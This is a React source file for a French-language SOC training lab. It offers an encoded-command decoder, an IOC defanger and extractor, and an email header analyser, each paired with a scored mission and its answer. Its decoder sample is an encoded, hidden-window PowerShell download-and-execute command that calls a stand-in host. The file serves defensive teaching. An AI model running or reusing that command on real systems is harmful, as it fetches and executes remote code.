import { Binary, CheckCircle2, Link2, Mail, ScanSearch, ShieldCheck, TriangleAlert, XCircle } from 'lucide-react'
import { useMemo, useState } from 'react'
import { Card, CodeBlock, CopyButton, PageHeader, btnGhost, inputCls } from '../components/ui'
import {
  analyzeHeaders,
  decodeBase64Auto,
  defang,
  encodeUtf16Base64,
  extractIocs,
  findIndicators,
  hexDecode,
  isPrivateIp,
  refang,
  urlDecode,
  type Iocs,
} from '../lib/forensics'
import { useProgress } from '../lib/progress'

export const LAB_MISSION_COUNT = 4

function Mission({ id, question, answers, placeholder }: { id: string; question: string; answers: string[]; placeholder: string }) {
  const { progress, completeMission } = useProgress()
  const [value, setValue] = useState('')
  const [wrong, setWrong] = useState(false)
  const done = progress.labMissions.includes(id)
  const norm = (s: string) => s.trim().toLowerCase()
  return (
    <div className={`mb-5 rounded-md border p-3 ${done ? 'border-emerald/50 bg-emerald/5' : 'border-amber/50 bg-amber/5'}`}>
      <p className="text-sm font-semibold text-white">Mission · 25 XP</p>
      <p className="mt-1 text-sm">{question}</p>
      {done ? (
        <p className="mt-2 flex items-center gap-1.5 text-sm text-emerald-300">
          <CheckCircle2 size={15} aria-hidden /> Mission accomplie
        </p>
      ) : (
        <form
          className="mt-2 flex flex-wrap gap-2"
          onSubmit={(e) => {
            e.preventDefault()
            if (answers.map(norm).includes(norm(value))) completeMission(id)
            else setWrong(true)
          }}
        >
          <input
            value={value}
            onChange={(e) => {
              setValue(e.target.value)
              setWrong(false)
            }}
            placeholder={placeholder}
            aria-label="Votre réponse"
            className={`${inputCls} min-w-0 flex-1 basis-56 font-mono`}
          />
          <button type="submit" className={btnGhost}>
            Vérifier
          </button>
          {wrong && <p className="w-full text-sm text-red-300">Ce n’est pas la réponse attendue. Utilisez l’outil ci-dessous.</p>}
        </form>
      )}
    </div>
  )
}

const SAMPLE_COMMAND = `powershell.exe -nop -w hidden -enc ${encodeUtf16Base64("IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync-update.example/a.ps1')")}`

type DecodeMode = 'base64' | 'hex' | 'url'

function DecoderTool() {
  const [input, setInput] = useState(SAMPLE_COMMAND)
  const [mode, setMode] = useState<DecodeMode>('base64')
  const result = useMemo(() => {
    if (!input.trim()) return null
    try {
      if (mode === 'base64') {
        const r = decodeBase64Auto(input)
        return { text: r.text, note: `Encodage détecté : ${r.encoding}${r.extractedFromCommandLine ? ' · valeur extraite de la ligne de commande' : ''}` }
      }
      if (mode === 'hex') return { text: hexDecode(input), note: 'Hexadécimal vers UTF-8' }
      return { text: urlDecode(input), note: 'URL décodée (jusqu’à 3 passes)' }
    } catch (e) {
      return { error: e instanceof Error ? e.message : 'Entrée invalide' }
    }
  }, [input, mode])
  const indicators = result && 'text' in result && result.text ? findIndicators(result.text) : []

  return (
    <>
      <Mission id="decode" question="Décodez la commande fournie. Quel domaine la charge contacte-t-elle ?" answers={['cdn-sync-update.example']} placeholder="exemple.domaine" />
      <div className="mb-2 flex flex-wrap gap-2">
        {(
          [
            ['base64', 'Base64 (UTF-16LE / UTF-8)'],
            ['hex', 'Hexadécimal'],
            ['url', 'URL'],
          ] as [DecodeMode, string][]
        ).map(([m, label]) => (
          <button key={m} type="button" onClick={() => setMode(m)} aria-pressed={mode === m} className={`rounded-md border px-3 py-1.5 text-sm ${mode === m ? 'border-cyan bg-cyan/10 text-white' : 'border-line text-mute hover:text-white'}`}>
            {label}
          </button>
        ))}
      </div>
      <label htmlFor="decode-input" className="mb-1 block text-sm text-mute">
        Collez une valeur encodée ou une ligne de commande PowerShell complète
      </label>
      <textarea id="decode-input" rows={4} value={input} onChange={(e) => setInput(e.target.value)} spellCheck={false} className={`${inputCls} font-mono text-xs break-all`} />
      {result && 'error' in result && (
        <p className="mt-2 flex items-center gap-1.5 text-sm text-red-300">
          <XCircle size={15} aria-hidden /> {result.error}
        </p>
      )}
      {result && 'text' in result && (
        <>
          <CodeBlock code={result.text ?? ''} lang={mode === 'base64' ? 'powershell' : 'text'} title={result.note} />
          {indicators.length > 0 && (
            <div className="rounded-md border border-crimson/50 bg-crimson/5 p-3 text-sm">
              <p className="flex items-center gap-1.5 font-semibold text-red-300">
                <TriangleAlert size={15} aria-hidden /> Indicateurs repérés
              </p>
              <ul className="mt-1 list-disc pl-5">
                {indicators.map((i) => (
                  <li key={i}>{i}</li>
                ))}
              </ul>
            </div>
          )}
        </>
      )}
    </>
  )
}

function DefangTool() {
  const [input, setInput] = useState('https://login-m365.example/auth?id=42\n203.0.113.50\ncontact@boite-anonyme.example')
  const defanged = defang(input)
  const refanged = refang(input)
  return (
    <>
      <Mission id="defang" question="Quelle est la forme défangée de https://evil-login.example/auth ?" answers={[defang('https://evil-login.example/auth')]} placeholder="hxxps[://]…" />
      <label htmlFor="defang-input" className="mb-1 block text-sm text-mute">
        Une entrée par ligne : URL, IP, domaine, email
      </label>
      <textarea id="defang-input" rows={4} value={input} onChange={(e) => setInput(e.target.value)} spellCheck={false} className={`${inputCls} font-mono text-[13px]`} />
      <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
        <CodeBlock code={defanged} lang="text" title="Défangé : à utiliser dans les tickets et les chats" />
        <CodeBlock code={refanged} lang="text" title="Réarmé : pour les outils, avec prudence" />
      </div>
    </>
  )
}

const IOC_SAMPLE = `Rapport sandbox pour Facture_0342.docm (lancé par WINWORD.EXE puis powershell.exe)
SHA-256 : 9f2c6a1e7b4d0c83a5e16d2f4b98c07a3d1e5f60b7c2849ae03d6f1c5b72e8d4
SHA-256 : 6e12fb04d8a75c39ba18f0627ed4c1a9835bf26d07ae49c1d3b768e502fa91c3
MD5 : 5d41402abc4b2a76b9719d911017c592
Connexions : hxxps[://]cdn-sync-update[.]example/a.ps1 et 203.0.113[.]50:443, 10.20.4.42
Expéditeur : compta[@]fournisseur-paiement.example
Vulnérabilité associée : CVE-2017-11882`

const IOC_LABELS: [keyof Iocs, string][] = [
  ['urls', 'URLs'],
  ['domains', 'Domaines'],
  ['ipv4', 'IPv4'],
  ['emails', 'Emails'],
  ['sha256', 'SHA-256'],
  ['sha1', 'SHA-1'],
  ['md5', 'MD5'],
  ['cves', 'CVE'],
]

function IocTool() {
  const [input, setInput] = useState(IOC_SAMPLE)
  const iocs = useMemo(() => extractIocs(input), [input])
  const all = IOC_LABELS.flatMap(([k]) => iocs[k])
  return (
    <>
      <Mission id="iocs" question="Dans le texte fourni, combien de hash SHA-256 distincts sont présents ?" answers={['2', 'deux']} placeholder="Nombre" />
      <label htmlFor="ioc-input" className="mb-1 block text-sm text-mute">
        Collez un rapport, un mail ou des logs. Les formes défangées sont prises en charge. Les extensions (.exe, .docm) ne sont pas prises pour des domaines.
      </label>
      <textarea id="ioc-input" rows={8} value={input} onChange={(e) => setInput(e.target.value)} spellCheck={false} className={`${inputCls} font-mono text-[13px]`} />
      <div className="mt-3 flex items-center justify-between">
        <p className="text-sm text-mute">{all.length} indicateurs uniques</p>
        {all.length > 0 && <CopyButton text={all.join('\n')} label="Tout copier" />}
      </div>
      <div className="mt-2 grid grid-cols-1 gap-3 md:grid-cols-2">
        {IOC_LABELS.filter(([k]) => iocs[k].length).map(([k, label]) => (
          <div key={k} className="rounded-md border border-line bg-bg p-3">
            <p className="mb-1.5 text-xs font-semibold tracking-wide text-cyan uppercase">
              {label} ({iocs[k].length})
            </p>
            <ul className="space-y-1 font-mono text-xs break-all">
              {iocs[k].map((v) => (
                <li key={v}>
                  {v}
                  {k === 'ipv4' && isPrivateIp(v) && <span className="ml-2 font-sans text-mute">(privée)</span>}
                </li>
              ))}
            </ul>
          </div>
        ))}
      </div>
    </>
  )
}

const HEADER_SAMPLE = `Received: from mx.contoso.example (mx.contoso.example [192.0.2.25])
        by mail.contoso.example with ESMTPS; Thu, 12 Mar 2026 08:41:12 +0000
Received: from mail-relay.fournisseur-paiement.example (unknown [203.0.113.45])
        by mx.contoso.example with ESMTP; Thu, 12 Mar 2026 08:41:10 +0000
Authentication-Results: mx.contoso.example;
        spf=softfail smtp.mailfrom=fournisseur-paiement.example;
        dkim=none;
        dmarc=fail header.from=contoso-rh.example
From: "Service RH" <rh@contoso-rh.example>
Return-Path: <bounce@fournisseur-paiement.example>
Reply-To: <paie.urgent@boite-anonyme.example>
Subject: Mise à jour urgente de vos coordonnées bancaires
Message-ID: <1773304870.42@fournisseur-paiement.example>`

const AUTH_CLS = (v?: string) => (v === 'pass' ? 'border-emerald/60 text-emerald-300' : v ? 'border-crimson/60 text-red-300' : 'border-line text-mute')

function HeaderTool() {
  const [input, setInput] = useState(HEADER_SAMPLE)
  const report = useMemo(() => analyzeHeaders(input), [input])
  const auth: [string, string | undefined][] = [
    ['SPF', report.spf],
    ['DKIM', report.dkim],
    ['DMARC', report.dmarc],
  ]
  return (
    <>
      <Mission id="headers" question="Quelle IP a réellement remis ce message à l’infrastructure de Contoso ?" answers={['203.0.113.45']} placeholder="0.0.0.0" />
      <label htmlFor="header-input" className="mb-1 block text-sm text-mute">
        Collez un en-tête brut. Un exemple de phishing simulé est préchargé.
      </label>
      <textarea id="header-input" rows={10} value={input} onChange={(e) => setInput(e.target.value)} spellCheck={false} className={`${inputCls} font-mono text-xs`} />

      <div className="mt-4 grid grid-cols-1 gap-4 lg:grid-cols-2">
        <div>
          <h3 className="mb-2 text-sm font-semibold text-white">Authentification</h3>
          <div className="flex gap-2">
            {auth.map(([name, value]) => (
              <div key={name} className={`flex-1 rounded-md border p-2 text-center ${AUTH_CLS(value)}`}>
                <p className="text-xs">{name}</p>
                <p className="font-mono text-sm font-bold">{value ?? 'absent'}</p>
              </div>
            ))}
          </div>
          <dl className="mt-3 space-y-1 text-sm">
            {(
              [
                ['IP source', report.originIp],
                ['Sujet', report.subject],
                ['From', report.from],
                ['Return-Path', report.returnPath],
                ['Reply-To', report.replyTo],
              ] as const
            ).map(([k, v]) => (
              <div key={k} className="flex gap-2">
                <dt className="w-24 shrink-0 text-mute">{k}</dt>
                <dd className="min-w-0 font-mono text-xs break-all">{v ?? '—'}</dd>
              </div>
            ))}
          </dl>
          <h3 className="mt-4 mb-2 text-sm font-semibold text-white">Constats</h3>
          <ul className="space-y-1.5 text-sm">
            {report.findings.map((f) => (
              <li key={f.text} className="flex gap-2">
                {f.level === 'ok' ? <ShieldCheck size={16} className="mt-0.5 shrink-0 text-emerald" aria-hidden /> : <TriangleAlert size={16} className={`mt-0.5 shrink-0 ${f.level === 'danger' ? 'text-crimson' : 'text-amber'}`} aria-hidden />}
                {f.text}
              </li>
            ))}
          </ul>
        </div>
        <div>
          <h3 className="mb-2 text-sm font-semibold text-white">Parcours du message (du premier au dernier relais)</h3>
          {report.hops.length === 0 && <p className="text-sm text-mute">Aucun en-tête Received détecté.</p>}
          <ol className="space-y-2">
            {report.hops.map((hop) => (
              <li key={hop.index} className="rounded-md border border-line bg-bg p-2.5 font-mono text-xs">
                <p className="font-bold text-white">
                  Relais {hop.index}
                  {hop.ip && <span className="ml-2 text-amber-300">{hop.ip}</span>}
                </p>
                <p className="mt-1 break-all">de {hop.from}</p>
                <p className="break-all">vers {hop.by}</p>
                {hop.date && <p className="mt-1 text-mute">{hop.date}</p>}
              </li>
            ))}
          </ol>
          <p className="mt-2 text-xs text-mute">Les relais les plus anciens peuvent être falsifiés par l’expéditeur. Seul le premier relais vu par votre infrastructure est fiable.</p>
        </div>
      </div>
    </>
  )
}

const TOOLS = [
  { id: 'decode', label: 'Décodeur', icon: Binary, view: DecoderTool },
  { id: 'defang', label: 'Defang / Refang', icon: Link2, view: DefangTool },
  { id: 'iocs', label: 'Extracteur d’IOC', icon: ScanSearch, view: IocTool },
  { id: 'headers', label: 'En-têtes email', icon: Mail, view: HeaderTool },
]

export function CyberLab() {
  const [tool, setTool] = useState(TOOLS[0].id)
  const current = TOOLS.find((t) => t.id === tool) ?? TOOLS[0]
  const { progress } = useProgress()
  return (
    <>
      <PageHeader eyebrow="Atelier" title="SOC CyberLab">
        Décodez, défangez et extrayez sans rien téléverser : tout s’exécute dans votre navigateur, aucune donnée ne quitte cette page.
      </PageHeader>
      <div role="tablist" className="mb-4 flex gap-1 overflow-x-auto border-b border-line">
        {TOOLS.map((t) => (
          <button
            key={t.id}
            type="button"
            role="tab"
            aria-selected={tool === t.id}
            onClick={() => setTool(t.id)}
            className={`-mb-px flex shrink-0 items-center gap-2 border-b-2 px-3 py-2 text-sm ${tool === t.id ? 'border-cyan font-medium text-white' : 'border-transparent text-mute hover:text-white'}`}
          >
            <t.icon size={15} aria-hidden />
            {t.label}
            {progress.labMissions.includes(t.id) && <CheckCircle2 size={13} className="text-emerald" aria-label="Mission accomplie" />}
          </button>
        ))}
      </div>
      <Card className="p-4 sm:p-5">
        <current.view />
      </Card>
      <p className="mt-3 text-xs text-mute">
        Rappel OPSEC : même en local, défangez avant de partager et ne collez pas de données classifiées dans un outil que vous ne maîtrisez pas.
      </p>
    </>
  )
}
